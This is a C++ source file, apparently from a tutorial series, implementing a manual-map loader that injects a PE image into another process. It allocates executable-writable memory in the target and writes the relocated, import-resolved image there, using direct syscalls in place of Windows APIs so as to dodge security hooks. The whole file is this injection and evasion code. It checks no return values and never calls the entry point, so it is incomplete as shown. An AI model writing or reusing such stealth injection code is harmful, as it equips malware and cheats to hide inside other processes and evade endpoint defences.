#include "mapper.h"
#include "../parser/pe_parser.h"
#include "../relocator/reloc.h"
#include "../resolver/iat_resolver.h"

// Note: Using our Step 3 Syscalls instead of standard Windows APIs
extern "C" NTSTATUS SyscallNtAllocateVirtualMemory(HANDLE hProc, PVOID* base, ULONG_PTR zeroBits, PSIZE_T size, ULONG allocationType, ULONG protect);
extern "C" NTSTATUS SyscallNtWriteVirtualMemory(HANDLE hProc, PVOID base, PVOID buffer, SIZE_T size, PSIZE_T bytesWritten);

bool ManualMap(HANDLE hTargetProc, const std::vector<uint8_t>& rawData) {
    PEParser parser(rawData);
    if (!parser.IsValid()) return false;

    PIMAGE_NT_HEADERS64 pNt = parser.GetNtHeaders();
    PVOID pRemoteBase = nullptr;
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;

    // 1. ALLOCATE: Using Direct Syscall
    SyscallNtAllocateVirtualMemory(hTargetProc, &pRemoteBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 2. STRETCH: Create our local "blueprint" (The logic you aced earlier)
    std::vector<uint8_t> localImage(pNt->OptionalHeader.SizeOfImage, 0);
    memcpy(localImage.data(), rawData.data(), pNt->OptionalHeader.SizeOfHeaders);
    
    auto* pSection = parser.GetSections();
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        memcpy(localImage.data() + pSection[i].VirtualAddress, 
               rawData.data() + pSection[i].PointerToRawData, 
               pSection[i].SizeOfRawData);
    }

    // 3. RELOCATE: Fix internal pointers
    LONGLONG delta = (LONGLONG)pRemoteBase - (LONGLONG)pNt->OptionalHeader.ImageBase;
    Relocator::FixRelocations(localImage.data(), pNt, delta);

    // 4. RESOLVE: Fix the IAT (Imports)
    IATResolver::Resolve(localImage.data(), pNt);

    // 5. COMMIT: Write the fully prepared image to the target
    SyscallNtWriteVirtualMemory(hTargetProc, pRemoteBase, localImage.data(), imageSize, nullptr);

    return true; 
}
